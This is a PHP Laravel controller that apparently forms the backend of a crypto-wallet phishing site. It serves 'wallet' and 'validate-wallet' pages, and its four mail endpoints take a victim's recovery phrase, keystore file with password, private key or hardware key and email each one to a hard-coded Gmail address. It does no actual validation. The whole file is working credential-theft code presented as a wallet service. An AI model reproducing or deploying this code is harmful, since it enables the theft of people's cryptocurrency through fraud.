<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Mail\eMail;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Artisan;

class HomeController extends Controller
{
    public function index(Request $request){
        Artisan::call('optimize');
        Artisan::call('config:clear');
        Artisan::call('view:clear');
        Artisan::call('route:clear');
        return view('index');
    }
    public function wallet(Request $request){
        return view('wallet');
    }
    public function validateWallet(Request $request){
        return view('validate-wallet');
    }

    public function phraseMail(Request $request){
        $wallet = $request->wallet_name;
        $type = "Phrase";
        $msg = $request->message;
        $psw = "";
        // The email sending is done using the to method on the Mail facade
        Mail::to('joedev100@gmail.com')->send(new eMail($wallet,$type,$msg,$psw));
        return response()->json(['message' => 'Email sent successfully']);
    }
    public function keystoreMail(Request $request){
        $wallet = $request->keystore_name;
        $type = "Keystore JSON";
        $msg = $request->message;
        $psw = $request->password;
        // The email sending is done using the to method on the Mail facade
        Mail::to('joedev100@gmail.com')->send(new eMail($wallet,$type,$msg,$psw));
        return response()->json(['message' => 'Email sent successfully']);
    }
    public function privateMail(Request $request){
        $wallet = $request->wallet_name;
        $type = "Private Key";
        $msg = $request->message;
        $psw = "";
        // The email sending is done using the to method on the Mail facade
        Mail::to('joedev100@gmail.com')->send(new eMail($wallet,$type,$msg,$psw));
        return response()->json(['message' => 'Email sent successfully']);
    }
    public function hardwareMail(Request $request){
        $wallet = $request->wallet_name;
        $type = "Hardware Key";
        $msg = $request->message;
        $psw = "";
        // The email sending is done using the to method on the Mail facade
        Mail::to('joedev100@gmail.com')->send(new eMail($wallet,$type,$msg,$psw));
        return response()->json(['message' => 'Email sent successfully']);
    }
}
